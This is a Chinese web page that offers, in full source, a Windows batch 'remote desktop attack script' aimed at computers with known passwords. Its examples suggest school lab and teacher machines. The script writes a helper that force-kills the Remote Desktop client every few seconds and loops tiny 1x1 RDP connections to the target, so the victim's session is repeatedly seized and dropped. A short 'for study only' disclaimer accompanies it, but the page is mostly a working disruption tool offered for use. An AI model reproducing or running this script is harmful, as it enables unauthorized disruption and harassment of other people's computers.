    远程桌面攻击脚本简介

    作者：朱佳乐深沉地爱着你

    作用：使用远程桌面攻击已知密码的计算机

    支持系统： Windows 7 及以上

    main下载

    源代码

    @echo off
color f0
title 朱佳乐深沉地爱着你 远程桌面攻击脚本
echo 作者：朱佳乐深沉地爱着你
echo 本脚本使用远程桌面攻击已知密码的计算机
echo 注意：本脚本仅供交流学习，禁止使用本脚本进行恶作剧
echo 注意：本脚本运行时不能打开远程桌面，本脚本不能同时运行多个
echo.
echo ########################################
echo 请输入靶机的“计算机名称”或“IP地址”，不区分大小写
echo 例如：room-stu-01  student-13-win7  teacher-57  192.168.100.98

:entername
set name=000.000.000.000
set /p name=请输入：
if %name%==000.000.000.000 (
    echo 输入不能为空！
    goto entername
)

echo.
echo ########################################
echo 请输入攻击间隔时间（单位：秒）
echo 即每次攻击开始到结束的时间，太短可能导致没有连接成功就结束
echo 例如：5  8（推荐）  10

:entertime
set waittime=0
set /p waittime=请输入：
if %waittime%==0 (
    echo 输入不能为0或空！
    goto entertime
)

del kill.bat > nul
echo @echo off > kill.bat
echo :start >> kill.bat
echo timeout /t %waittime% >> kill.bat
echo taskkill /im mstsc.exe /f >> kill.bat
echo goto start >> kill.bat

echo.
echo ########################################
echo 接下来进行测试连接，请注意每个“记住”、“不再”选项都要勾选
echo 按下任意键测试……
pause > nul
mstsc /v %name% /span
echo 如果测试成功，按下任意键开始……
pause > nul

start /min kill.bat
:start
mstsc /v %name% /w:1 /h:1
goto start
